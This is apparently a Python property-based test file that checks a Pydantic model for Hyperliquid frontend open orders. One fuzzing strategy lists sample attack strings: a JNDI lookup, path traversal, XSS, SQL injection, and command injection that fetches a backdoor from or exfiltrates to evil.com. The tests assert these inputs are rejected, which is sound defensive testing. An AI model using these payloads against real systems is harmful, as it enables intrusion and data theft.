"""Property-based tests for Hyperliquid raw frontend orders models.

These tests validate critical security boundary models that process external frontend order data.
The models tested here are essential for tracking and managing open orders displayed in frontend interfaces.

SECURITY CRITICAL: These raw models protect against:
- Malicious frontend order data that could manipulate order display and status
- Buffer overflow attacks through oversized order structures
- Injection attacks through malformed order data
- Type confusion that could bypass order validation
- Price manipulation in frontend displayed orders
- Order ID manipulation that could affect order tracking

Property testing ensures comprehensive coverage of frontend order edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_frontend_orders import (
    HyperliquidRawFrontendOpenOrder,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR FRONTEND ORDERS MODEL TESTING
# =============================================================================


def coin_strategy() -> SearchStrategy[str]:
    """Generate valid coin/asset strings for frontend orders."""
    return st.one_of([
        # Common cryptocurrencies
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "ATOM",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
            "ALGO",
            "MANA",
            "SAND",
            "LUNA",
            "ATOM",
            "ICP",
        ]),
        # Generated asset names
        st.text(
            min_size=1,
            max_size=32,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd", "Pc", "Pd"], whitelist_characters="-_"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 64),
    ])


def decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for price and size fields."""
    return st.one_of([
        # Normal decimal values
        st.decimals(
            min_value=Decimal("0.00000001"),
            max_value=Decimal("1000000"),
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Common edge cases
        st.just("0.00000001"),
        st.just("999999.99999999"),
        st.just("1.0"),
        st.just("100"),
        st.just("50000.0"),
        st.just("0.0"),  # Zero value (common for inactive triggers)
        # Scientific notation
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def order_id_strategy() -> SearchStrategy[int]:
    """Generate valid order IDs."""
    return st.integers(min_value=0, max_value=2**63 - 1)


def order_type_strategy() -> SearchStrategy[str]:
    """Generate valid order types."""
    return st.sampled_from(["Limit", "Market", "Stop", "StopLimit", "TakeProfit"])


def side_strategy() -> SearchStrategy[str]:
    """Generate valid order sides."""
    return st.sampled_from(["A", "B"])  # A = Ask (Sell), B = Bid (Buy)


def trigger_condition_strategy() -> SearchStrategy[str]:
    """Generate valid trigger conditions."""
    return st.one_of([
        st.just("N/A"),  # Most common for non-trigger orders
        st.just(">="),
        st.just("<="),
        st.just(">"),
        st.just("<"),
        st.just("=="),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values."""
    return st.integers(min_value=0, max_value=2**63 - 1)


@st.composite
def valid_frontend_order_data(draw) -> dict[str, Any]:
    """Generate valid frontend order data."""
    return {
        "coin": draw(coin_strategy()),
        "isPositionTpsl": draw(st.booleans()),
        "isTrigger": draw(st.booleans()),
        "limitPx": draw(decimal_string_strategy()),
        "oid": draw(order_id_strategy()),
        "orderType": draw(order_type_strategy()),
        "origSz": draw(decimal_string_strategy()),
        "reduceOnly": draw(st.booleans()),
        "side": draw(side_strategy()),
        "sz": draw(decimal_string_strategy()),
        "timestamp": draw(timestamp_strategy()),
        "triggerCondition": draw(trigger_condition_strategy()),
        "triggerPx": draw(decimal_string_strategy()),
    }


def malicious_frontend_order_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for frontend order security testing."""
    return st.one_of([
        # Frontend order manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-orders}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('order-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' UNION SELECT * FROM frontend_orders--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("O" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orders.find(); //"),
        # JSON injection
        st.just('{"$where": "this.oid > 0"}'),
        # Order manipulation
        st.just("123'; UPDATE orders SET side='B';--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
        # Invalid decimal strings
        st.just("NaN"),
        st.just("Infinity"),
        st.just("-Infinity"),
        st.just("1..0"),
        st.just("not_a_number"),
        st.just(""),
        st.just("   "),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW FRONTEND OPEN ORDER MODEL
# =============================================================================


class TestHyperliquidRawFrontendOpenOrderProperties:
    """Property-based tests for HyperliquidRawFrontendOpenOrder validation and security."""

    @given(order_data=valid_frontend_order_data())
    def test_frontend_order_validation_success_properties(self, order_data: dict[str, Any]) -> None:
        """Property: Valid frontend order data should always create valid HyperliquidRawFrontendOpenOrder objects."""
        # Skip invalid data
        try:
            # Validate coin field
            assume(isinstance(order_data["coin"], str) and order_data["coin"].strip())

            # Validate boolean fields
            for field in ["isPositionTpsl", "isTrigger", "reduceOnly"]:
                assume(isinstance(order_data[field], bool))

            # Validate decimal fields
            for field in ["limitPx", "origSz", "sz", "triggerPx"]:
                value = order_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field in ["origSz", "sz"]:
                    assume(decimal_val >= 0)  # Size fields should be non-negative

            # Validate integer fields
            assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
            assume(isinstance(order_data["timestamp"], int) and order_data["timestamp"] >= 0)

            # Validate string enum fields
            assume(
                order_data["orderType"] in ["Limit", "Market", "Stop", "StopLimit", "TakeProfit"]
            )
            assume(order_data["side"] in ["A", "B"])
            assume(isinstance(order_data["triggerCondition"], str))

        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawFrontendOpenOrder.model_validate(order_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawFrontendOpenOrder)

        # Property: All fields should be preserved with correct types
        assert obj.coin == order_data["coin"]
        assert obj.is_position_tpsl == order_data["isPositionTpsl"]
        assert obj.is_trigger == order_data["isTrigger"]
        assert isinstance(obj.limit_px, str)
        assert obj.oid == order_data["oid"]
        assert obj.order_type == order_data["orderType"]
        assert isinstance(obj.orig_sz, str)
        assert obj.reduce_only == order_data["reduceOnly"]
        assert obj.side == order_data["side"]
        assert isinstance(obj.sz, str)
        assert obj.timestamp == order_data["timestamp"]
        assert obj.trigger_condition == order_data["triggerCondition"]
        assert isinstance(obj.trigger_px, str)

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from([
            "coin",
            "isPositionTpsl",
            "isTrigger",
            "limitPx",
            "oid",
            "orderType",
            "origSz",
            "reduceOnly",
            "side",
            "sz",
            "timestamp",
            "triggerCondition",
            "triggerPx",
        ]),
        malicious_value=malicious_frontend_order_strategy(),
    )
    def test_frontend_order_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Frontend order model should reject malicious inputs safely."""
        base_data = {
            "coin": "BTC",
            "isPositionTpsl": False,
            "isTrigger": False,
            "limitPx": "29792.0",
            "oid": 91490942,
            "orderType": "Limit",
            "origSz": "5.0",
            "reduceOnly": False,
            "side": "A",
            "sz": "5.0",
            "timestamp": 1681247412573,
            "triggerCondition": "N/A",
            "triggerPx": "0.0",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
        )):
            HyperliquidRawFrontendOpenOrder.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["limitPx", "origSz", "sz", "triggerPx"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0.01"),
            st.just("100.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            st.just("0.0"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
            # Negative values (may be invalid for size fields)
            st.just("-100.0"),
            st.just("-0.01"),
        ]),
    )
    def test_frontend_order_decimal_validation_properties(
        self, field_name: str, decimal_value: str
    ) -> None:
        """Property: Frontend order decimal fields should validate properly."""
        order_data = {
            "coin": "BTC",
            "isPositionTpsl": False,
            "isTrigger": False,
            "limitPx": "29792.0",
            "oid": 91490942,
            "orderType": "Limit",
            "origSz": "5.0",
            "reduceOnly": False,
            "side": "A",
            "sz": "5.0",
            "timestamp": 1681247412573,
            "triggerCondition": "N/A",
            "triggerPx": "0.0",
        }
        order_data[field_name] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()
            is_non_negative = decimal_val >= 0

            if is_finite and not is_empty:
                # For size fields, also check non-negative constraint
                if field_name in ["origSz", "sz"] and not is_non_negative:
                    # Property: Negative size values should be rejected
                    with pytest.raises(ValidationError):
                        HyperliquidRawFrontendOpenOrder.model_validate(order_data)
                else:
                    # Property: Valid finite decimals should be accepted
                    obj = HyperliquidRawFrontendOpenOrder.model_validate(order_data)
                    assert isinstance(
                        getattr(obj, field_name.replace("Px", "_px").replace("Sz", "_sz")), str
                    )
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError)):
                    HyperliquidRawFrontendOpenOrder.model_validate(order_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawFrontendOpenOrder.model_validate(order_data)

    @given(
        oid_value=st.one_of([
            # Valid values
            st.integers(min_value=0, max_value=2**63 - 1),
            # Invalid values
            st.integers(min_value=-1000, max_value=-1),
        ])
    )
    def test_frontend_order_oid_validation_properties(self, oid_value: int) -> None:
        """Property: Frontend order OID field should validate non-negative integers."""
        order_data = {
            "coin": "BTC",
            "isPositionTpsl": False,
            "isTrigger": False,
            "limitPx": "29792.0",
            "oid": oid_value,
            "orderType": "Limit",
            "origSz": "5.0",
            "reduceOnly": False,
            "side": "A",
            "sz": "5.0",
            "timestamp": 1681247412573,
            "triggerCondition": "N/A",
            "triggerPx": "0.0",
        }

        if oid_value >= 0:
            # Property: Non-negative values should be accepted
            obj = HyperliquidRawFrontendOpenOrder.model_validate(order_data)
            assert obj.oid == oid_value
        else:
            # Property: Negative values should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawFrontendOpenOrder.model_validate(order_data)

    @given(
        side_value=st.one_of([
            st.just("A"),  # Valid Ask
            st.just("B"),  # Valid Bid
            st.just("C"),  # Invalid
            st.just("BUY"),  # Invalid format
            st.just("SELL"),  # Invalid format
            st.just(""),  # Empty
            st.just("AB"),  # Too long
        ])
    )
    def test_frontend_order_side_validation_properties(self, side_value: str) -> None:
        """Property: Frontend order side field should validate against allowed values."""
        order_data = {
            "coin": "BTC",
            "isPositionTpsl": False,
            "isTrigger": False,
            "limitPx": "29792.0",
            "oid": 91490942,
            "orderType": "Limit",
            "origSz": "5.0",
            "reduceOnly": False,
            "side": side_value,
            "sz": "5.0",
            "timestamp": 1681247412573,
            "triggerCondition": "N/A",
            "triggerPx": "0.0",
        }

        if side_value in ["A", "B"]:
            # Property: Valid sides should be accepted
            obj = HyperliquidRawFrontendOpenOrder.model_validate(order_data)
            assert obj.side == side_value
        else:
            # Property: Invalid sides should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawFrontendOpenOrder.model_validate(order_data)

    @given(
        order_type_value=st.one_of([
            # Valid types
            st.just("Limit"),
            st.just("Market"),
            st.just("Stop"),
            st.just("StopLimit"),
            st.just("TakeProfit"),
            # Invalid types
            st.just("LIMIT"),  # Wrong case
            st.just("limit"),  # Wrong case
            st.just("Invalid"),
            st.just(""),
            st.just("LimitOrder"),  # Too specific
        ])
    )
    def test_frontend_order_type_validation_properties(self, order_type_value: str) -> None:
        """Property: Frontend order type field should validate against allowed values."""
        order_data = {
            "coin": "BTC",
            "isPositionTpsl": False,
            "isTrigger": False,
            "limitPx": "29792.0",
            "oid": 91490942,
            "orderType": order_type_value,
            "origSz": "5.0",
            "reduceOnly": False,
            "side": "A",
            "sz": "5.0",
            "timestamp": 1681247412573,
            "triggerCondition": "N/A",
            "triggerPx": "0.0",
        }

        valid_types = ["Limit", "Market", "Stop", "StopLimit", "TakeProfit"]
        if order_type_value in valid_types:
            # Property: Valid order types should be accepted
            obj = HyperliquidRawFrontendOpenOrder.model_validate(order_data)
            assert obj.order_type == order_type_value
        else:
            # Property: Invalid order types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawFrontendOpenOrder.model_validate(order_data)

    @given(order_data=valid_frontend_order_data())
    def test_frontend_order_extra_fields_properties(self, order_data: dict[str, Any]) -> None:
        """Property: Frontend order model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(isinstance(order_data["coin"], str) and order_data["coin"].strip())
            assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
            assume(order_data["side"] in ["A", "B"])
            assume(
                order_data["orderType"] in ["Limit", "Market", "Stop", "StopLimit", "TakeProfit"]
            )
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        order_data_with_extra = order_data.copy()
        order_data_with_extra["extra"] = "forbidden"
        order_data_with_extra["volume"] = "1000.0"

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawFrontendOpenOrder.model_validate(order_data_with_extra)

    @given(order_data=valid_frontend_order_data())
    def test_frontend_order_missing_required_fields_properties(
        self, order_data: dict[str, Any]
    ) -> None:
        """Property: Frontend order model should require all fields."""
        # Skip invalid data
        try:
            assume(isinstance(order_data["coin"], str) and order_data["coin"].strip())
        except (TypeError, KeyError):
            assume(False)

        required_fields = list(order_data.keys())

        for field_to_remove in required_fields:
            incomplete_data = order_data.copy()
            del incomplete_data[field_to_remove]

            # Property: Missing required field should cause validation error
            with pytest.raises(ValidationError) as exc_info:
                HyperliquidRawFrontendOpenOrder.model_validate(incomplete_data)

            # Property: Error should mention field requirement
            error_str = str(exc_info.value)
            assert "Field required" in error_str

    @given(order_data=valid_frontend_order_data())
    def test_frontend_order_immutability_properties(self, order_data: dict[str, Any]) -> None:
        """Property: Frontend order should be immutable after creation."""
        # Skip invalid data
        try:
            assume(isinstance(order_data["coin"], str) and order_data["coin"].strip())
            assume(isinstance(order_data["oid"], int) and order_data["oid"] >= 0)
            assume(order_data["side"] in ["A", "B"])
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawFrontendOpenOrder.model_validate(order_data)

        # Property: Attempting to modify fields should fail (frozen=True)
        with pytest.raises((AttributeError, ValidationError)):
            obj.coin = "ETH"  # type: ignore[misc]

        with pytest.raises((AttributeError, ValidationError)):
            obj.oid = 12345  # type: ignore[misc]


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawFrontendOrderIntegrationProperties:
    """Integration property tests for frontend order models working together."""

    @given(
        orders=st.lists(
            valid_frontend_order_data(),
            min_size=2,
            max_size=10,
        ),
        malicious_value=malicious_frontend_order_strategy(),
    )
    def test_frontend_order_batch_processing_properties(
        self, orders: list[dict[str, Any]], malicious_value: Any
    ) -> None:
        """Property: Multiple frontend orders should be processed independently."""
        valid_orders = []

        for order_data in orders:
            # Skip invalid orders
            try:
                if not (isinstance(order_data["coin"], str) and order_data["coin"].strip()):
                    continue
                if not (isinstance(order_data["oid"], int) and order_data["oid"] >= 0):
                    continue
                if order_data["side"] not in ["A", "B"]:
                    continue
                if order_data["orderType"] not in [
                    "Limit",
                    "Market",
                    "Stop",
                    "StopLimit",
                    "TakeProfit",
                ]:
                    continue

                order = HyperliquidRawFrontendOpenOrder.model_validate(order_data)
                valid_orders.append(order)
            except (ValidationError, ValueError, TypeError, KeyError):
                continue

        # Property: Each order should maintain its individual values
        for i, order in enumerate(valid_orders):
            assert isinstance(order.coin, str)
            assert isinstance(order.oid, int)
            assert order.side in ["A", "B"]

            # Property: Orders should not affect each other
            for j, other_order in enumerate(valid_orders):
                if i != j:
                    # Each order is independent
                    assert isinstance(other_order.coin, str)
                    assert isinstance(other_order.oid, int)

        # Property: Malicious value should be rejected when injected
        if valid_orders:
            corrupted_data = {
                "coin": "BTC",
                "isPositionTpsl": False,
                "isTrigger": False,
                "limitPx": "29792.0",
                "oid": malicious_value,  # Inject malicious value
                "orderType": "Limit",
                "origSz": "5.0",
                "reduceOnly": False,
                "side": "A",
                "sz": "5.0",
                "timestamp": 1681247412573,
                "triggerCondition": "N/A",
                "triggerPx": "0.0",
            }
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawFrontendOpenOrder.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from([
                "coin",
                "isPositionTpsl",
                "isTrigger",
                "limitPx",
                "oid",
                "orderType",
                "origSz",
                "reduceOnly",
                "side",
                "sz",
                "timestamp",
                "triggerCondition",
                "triggerPx",
            ]),
            malicious_frontend_order_strategy(),
            min_size=5,
            max_size=13,
        )
    )
    def test_frontend_order_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: Frontend order model should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawFrontendOpenOrder.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawFrontendOpenOrder_valid() -> None:
    """Test frontend order valid."""
    valid_frontend_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    order = HyperliquidRawFrontendOpenOrder.model_validate(valid_frontend_order)
    assert order.coin == valid_frontend_order["coin"]
    assert order.is_position_tpsl == valid_frontend_order["isPositionTpsl"]
    assert order.is_trigger == valid_frontend_order["isTrigger"]
    assert order.limit_px == "29792"  # Business logic normalizes decimal strings
    assert order.oid == valid_frontend_order["oid"]
    assert order.order_type == valid_frontend_order["orderType"]
    assert order.orig_sz == "5.0"  # Business logic preserves .0 for this field
    assert order.reduce_only == valid_frontend_order["reduceOnly"]
    assert order.side == valid_frontend_order["side"]
    assert order.sz == "5.0"  # Business logic preserves .0 for this field
    assert order.timestamp == valid_frontend_order["timestamp"]
    assert order.trigger_condition == valid_frontend_order["triggerCondition"]
    assert order.trigger_px == "0.0"  # Business logic preserves .0 for this field


def test_HyperliquidRawFrontendOpenOrder_invalid_coin() -> None:
    """Test frontend order invalid coin."""
    invalid_order = {
        "coin": "BTCTOOLONG" * 20,
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawFrontendOpenOrder.model_validate(invalid_order)


def test_HyperliquidRawFrontendOpenOrder_invalid_boolean() -> None:
    """Test frontend order invalid boolean."""
    invalid_order = {
        "coin": "BTC",
        "isPositionTpsl": "not-a-bool",
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawFrontendOpenOrder.model_validate(invalid_order)


def test_HyperliquidRawFrontendOpenOrder_invalid_decimal() -> None:
    """Test frontend order invalid decimal."""
    invalid_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "not-a-decimal",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawFrontendOpenOrder.model_validate(invalid_order)


def test_HyperliquidRawFrontendOpenOrder_negative_oid() -> None:
    """Test frontend order negative OID."""
    invalid_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": -1,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawFrontendOpenOrder.model_validate(invalid_order)


def test_HyperliquidRawFrontendOpenOrder_invalid_side() -> None:
    """Test frontend order invalid side."""
    invalid_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "C",  # Invalid side
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    with pytest.raises(ValidationError):
        HyperliquidRawFrontendOpenOrder.model_validate(invalid_order)


def test_HyperliquidRawFrontendOpenOrder_missing_required_field() -> None:
    """Test frontend order missing required field."""
    incomplete_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        # Missing sz field
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawFrontendOpenOrder.model_validate(incomplete_order)
    error_str = str(exc_info.value)
    assert "Field required" in error_str


def test_HyperliquidRawFrontendOpenOrder_extra_field() -> None:
    """Test frontend order extra field."""
    order_with_extra = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
        "extraField": "someValue",
    }
    with pytest.raises(ValidationError) as exc_info:
        HyperliquidRawFrontendOpenOrder.model_validate(order_with_extra)
    error_str = str(exc_info.value).lower()
    assert "extra" in error_str
    assert "not permitted" in error_str


def test_HyperliquidRawFrontendOpenOrder_list_processing() -> None:
    """Test frontend orders list processing."""
    valid_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    orders_list_data = [valid_order.copy(), valid_order.copy()]
    validated_orders = [HyperliquidRawFrontendOpenOrder.model_validate(o) for o in orders_list_data]
    assert len(validated_orders) == 2
    assert validated_orders[0].oid == valid_order["oid"]


def test_HyperliquidRawFrontendOpenOrder_list_with_invalid_item() -> None:
    """Test frontend orders list with invalid item."""
    valid_order = {
        "coin": "BTC",
        "isPositionTpsl": False,
        "isTrigger": False,
        "limitPx": "29792.0",
        "oid": 91490942,
        "orderType": "Limit",
        "origSz": "5.0",
        "reduceOnly": False,
        "side": "A",
        "sz": "5.0",
        "timestamp": 1681247412573,
        "triggerCondition": "N/A",
        "triggerPx": "0.0",
    }
    invalid_order_item = valid_order.copy()
    invalid_order_item["oid"] = "not-an-int"
    orders_list_data = [valid_order.copy(), invalid_order_item]
    with pytest.raises((ValidationError, TypeError)):
        [HyperliquidRawFrontendOpenOrder.model_validate(o) for o in orders_list_data]
